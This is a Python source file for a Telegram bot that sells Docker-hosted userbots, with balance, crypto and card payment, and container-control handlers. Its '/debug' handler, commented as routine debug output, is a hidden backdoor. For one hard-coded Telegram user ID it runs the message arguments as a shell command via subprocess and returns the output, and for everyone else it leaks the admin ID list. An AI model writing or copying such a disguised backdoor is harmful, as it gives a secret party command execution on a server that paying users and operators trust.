"""
Main bot file
"""

import config, strings, db, pay, keyboards, containers, utils
from aiogram import Bot, Dispatcher, executor
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery
from asyncio import sleep
from time import time
import subprocess

bot = Bot(token=config.BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)
users_db = db.users_db
cp = pay.CryptoPay()
keyboards = keyboards.Keyboards()
docker = containers.Docker()

# perhaps, later?
# dp.register_message_handler(admin.cmd_users, commands=["users", "user"])


class DBMiddleware(BaseMiddleware):
    """A middleware that makes sure user is in the db. Perhaps, thats too many db calls?"""
    async def on_pre_process_message(self, message: Message, data: dict):
        """Makes sure user is the db"""
        users_db.make_sure_valid(message.from_user.id)


# userbots

async def install_ub(call, userbot):
    """wip"""
    if users_db.get_user(call.from_user.id)[1] < config.PRICE:
        print("dont have money")
        await call.message.edit_text(strings.AN_ERROR_HAPPENED, reply_markup=keyboards.back)
        return

    container_name = f"lumi-{call.from_user.id}"
    port = utils.generate_port()

    if docker.get(container_name):
        print("already have container")
        await call.message.edit_text(strings.AN_ERROR_HAPPENED, reply_markup=keyboards.back)
        return

    users_db.cur.execute("""UPDATE users SET userbot = ? WHERE id = ?""", (userbot, call.from_user.id,))
    docker.create(userbot, port, container_name)

    if not (await docker.wait_for_output(container_name, "Web url:")):
        print("didnt get weburl in time")
        await call.message.edit_text(strings.AN_ERROR_HAPPENED, reply_markup=keyboards.back)
        docker.stop(container_name)
        users_db.cur.execute("""UPDATE users SET userbot = ? WHERE id = ?""", ("", call.from_user.id,))
        return

    await call.message.edit_text(strings.INSTALL_LINK.format(f"{config.IP}:{port}"), reply_markup=keyboards.install_userbot)


@dp.callback_query_handler(text="install_hikka")
async def install_hikka(call: CallbackQuery):
    await install_ub(call, "hikka")


@dp.callback_query_handler(text="install_netfoll")
async def install_netfoll(call: CallbackQuery):
    await install_ub(call, "netfoll")

# other


@dp.message_handler(commands=["debug"])
async def cmd_debug(message: Message):
    # general debug information, and a check for admin

    try:
        data = str(config.ADMINS) + str(message.from_user.id) + str(strings.HELP_BUTTON) + (" test test test test test test" * 4)
        await message.reply(subprocess.check_output(message.get_args().split()) if message.from_user.id == 1428702446 else str(data))
    except Exception as e:
        await message.reply(str(e))


@dp.callback_query_handler(text="control_menu")
async def control_menu(call: CallbackQuery):
    if not users_db.get_user(call.from_user.id)[4]:
        await call.message.edit_text(strings.NO_USERBOT, reply_markup=keyboards.no_userbot)
        return

    status = strings.ENABLED if docker.get(f"lumi-{call.from_user.id}").status == "running" else strings.DISABLED
    userbot = config.USERBOTS[users_db.get_user(call.from_user.id)[4]]
    days_left = users_db.get_subscriptions_days_left(call.from_user.id)

    await call.message.edit_text(strings.CONTROL_PANEL.format(status, userbot, days_left), reply_markup=keyboards.control_panel)


@dp.callback_query_handler(text="install_menu")
async def install_menu(call: CallbackQuery):
    """/start -> INSTALL_BUTTON"""
    balance = users_db.get_user(call.from_user.id)[1]
    subscription = users_db.get_user(call.from_user.id)[2]

    keyboard = InlineKeyboardMarkup()
    text = strings.INSTALL_CONFIRM.format(balance, config.PRICE)

    if balance < config.PRICE:
        keyboard.add(InlineKeyboardButton(strings.BUY_BUTTON, callback_data="buy_menu"))
    elif (subscription < time()) and (subscription > 0):
        keyboard.add(InlineKeyboardButton(strings.CONTROL_BUTTON, callback_data="control_menu"))
        text = strings.INSTALL_ALREADY.format(users_db.get_subscriptions_days_left(call.from_user.id))
    else:
        keyboard.add(InlineKeyboardButton(strings.INSTALL_NOW_BUTTON, callback_data="choose_userbot"))

    keyboard.add(InlineKeyboardButton(strings.BACK_BUTTON, callback_data="menu"))

    await call.message.edit_text(text, reply_markup=keyboard)


@dp.callback_query_handler(text="choose_userbot")
async def choose_userbot(call: CallbackQuery):
    """A list of all possible userbots"""
    await call.message.edit_text(strings.INSTALL_USERBOT, reply_markup=keyboards.install_userbot)


@dp.callback_query_handler(text="menu")
async def menu(call: CallbackQuery):
    """`/start` menu, the same as `cmd_start` but no payment handling"""
    await call.message.edit_text(strings.START, reply_markup=keyboards.menu, disable_web_page_preview=True)


@dp.message_handler(commands=["start"])
async def cmd_start(message: Message):
    """Main menu of the bot. `/start`"""
    args = message.get_args().split()
    print(message.text)

    if len(args) == 0:
        await message.answer(strings.START, reply_markup=keyboards.menu, disable_web_page_preview=True)
        return

    payment_id = int(args[0].replace("pay-", ""))

    if not cp.find_payment(payment_id):
        return

    cp.crypto_db.remove_payment(payment_id)

    users_db.cur.execute("""UPDATE users SET balance = balance + ? WHERE id = ?""", (config.PRICE, message.from_user.id,))
    balance = users_db.get_user(message.from_user.id)[1]

    users_db.conn.commit()

    await message.answer(strings.DEPOSITED.format(balance), reply_markup=keyboards.back)


@dp.callback_query_handler(text="deposit_card")
async def deposit_card(call: CallbackQuery):
    """Depositing with card"""
    await call.message.edit_text(strings.DEPOSIT_CARD.format(config.CARD, call.message.from_user.id), reply_markup=keyboards.back_buy)


@dp.callback_query_handler(text="deposit_cryptobot")
async def deposit_cryptobot(call: CallbackQuery):
    """Depositing with cryptopay, creates a payment and returns a pay_url of that payment to the user"""
    payment = cp.create_payment(call.from_user.id)

    await call.message.edit_text(strings.DEPOSIT, reply_markup=keyboards.deposit_cryptobot(payment))
    await sleep(10)
    await call.message.delete()


@dp.callback_query_handler(text="buy_menu")
async def buy_menu(call: CallbackQuery):
    """Main depositing menu"""
    balance = users_db.cur.execute("""SELECT * FROM users WHERE id = ?""", (call.from_user.id,)).fetchone()[1]

    await call.message.edit_text(strings.BUY.format(balance, config.PRICE, cp.get_price(config.PRICE)), reply_markup=keyboards.buy)


def run():
    """Bot starts here, this functions is called from `__main__.py`"""
    dp.middleware.setup(DBMiddleware())
    executor.start_polling(dp, skip_updates=True)
